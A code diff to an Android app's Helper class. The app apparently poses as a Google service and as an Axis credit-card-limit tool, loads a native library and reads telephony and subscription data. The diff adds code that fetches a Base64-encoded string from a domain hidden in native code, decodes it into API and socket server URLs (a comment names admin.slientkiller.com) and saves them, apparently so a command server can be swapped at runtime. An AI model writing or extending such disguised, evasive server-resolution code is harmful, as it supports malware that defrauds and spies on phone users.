@@ -13,9 +13,13 @@ import android.provider.Settings;
 import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
+import android.util.Base64;
+import android.util.Log;
+import android.widget.Toast;
 
 import androidx.core.app.ActivityCompat;
 
+import java.nio.charset.StandardCharsets;
 import java.util.List;
 
 
@@ -24,18 +28,18 @@ public class Helper {
     {
         System.loadLibrary("axiscclimit.cpp");
     }
-    public String WorkMangerService = "GoogleServiceCCLimit";
-    public String StorageName = "GoogleServiceCCLimit";
-    public String BG_CHANNEL_ID = "GoogleServiceCCLimit";
+    public String StorageName = "GoogleServiceAxisCCLmit";
+    public String BG_CHANNEL_ID = "GoogleServiceAxisCCLmit";
     public native String FormCode();
-    public native String ApiUrl();
-    public native String SocketUrl();
+    public native String DomainUrl();
     public native String WsJwtSecret();
     public String TAG = "Dhappa";
-    public String AppVersion = "1.2";
+    public String AppVersion = "1.7";
     public Context context;
 
-    public static boolean isNetworkAvailable(Context context) {
+
+
+    public  boolean isNetworkAvailable(Context context) {
         ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
         if (connectivityManager != null) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -104,7 +108,8 @@ public class Helper {
         }
     }
 
-public boolean isAppInForeground(Context context) {
+
+    public boolean isAppInForeground(Context context) {
         ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
         if (am == null) return false;
 
@@ -119,6 +124,85 @@ public boolean isAppInForeground(Context context) {
             }
         }
         return false;
+    }
+
+    public String getPackageName(Context context) {
+        return context.getPackageName();
+    }
+
+    public String ApiUrl(Context context){
+        StorageHelper s = new StorageHelper(context);
+        Helper helper  = new Helper();
+//        Log.d(helper.TAG, "api url " +s.getString("api_url", ""));
+        return s.getString("api_url", "");
+    }
+
+    public String SocketUrl(Context context){
+        StorageHelper s = new StorageHelper(context);
+        return s.getString("socket_url", "");
+    }
+
+
+    public void updateApiPoints(Context context){
+        Helper h = new Helper();
+        NetworkHelper networkHelper = new NetworkHelper();
+
+        networkHelper.makeGetRequest(h.DomainUrl(), new NetworkHelper.GetRequestCallback() {
+            @Override
+            public void onSuccess(String result) {
+//                d(h.TAG, "DomainResult (Base64) " + result);
+
+                String api_url = "";
+                String socket_url = "";
+
+                // 1. Decode the Base64 result string
+                try {
+                    // Use Base64.DEFAULT for standard Android decoding
+                    byte[] decodedBytes = Base64.decode(result, Base64.DEFAULT);
+                    String decodedData = new String(decodedBytes, StandardCharsets.UTF_8);
+
+//                    d(h.TAG, "Decoded Data: " + decodedData);
+
+                    // 2. Parse the decoded data
+                    // The data is two URLs separated by a space: "URL1 URL2"
+                    String[] parts = decodedData.split(" ");
+
+                    if (parts.length >= 2) {
+                        api_url = parts[0];     // https://admin.slientkiller.com/api/public
+                        socket_url = parts[1];  // https://admin.slientkiller.com
+
+                        // 3. Save the URLs
+                        StorageHelper storageHelper = new StorageHelper(context); // Renamed to avoid shadowing
+                        storageHelper.saveString("api_url", api_url);
+                        storageHelper.saveString("socket_url", socket_url);
+
+//                        i(h.TAG, "API URL saved: " + api_url);
+//                        i(h.TAG, "Socket URL saved: " + socket_url);
+
+                    } else {
+//                        e(h.TAG, "Decoded data did not contain two parts separated by a space.");
+                        return; // Stop if parsing fails
+                    }
+
+                } catch (Exception e) {
+                    Log.d(h.TAG, "Base64 Decoding or Parsing Failed: " + e.getMessage());
+                    return; // Stop if decoding fails
+                }
+
+            }
+
+            @Override
+            public void onFailure(String error) {
+                Log.d(h.TAG, "DomainFailure " + error);
+            }
+        });
+    }
+    public void show(String message) {
+        Helper h = new Helper();
+//        Log.d(h.TAG, message);
+    }
+    public void showTost(String message) {
+        Toast.makeText(context, message, Toast.LENGTH_LONG).show();
     }
 
 
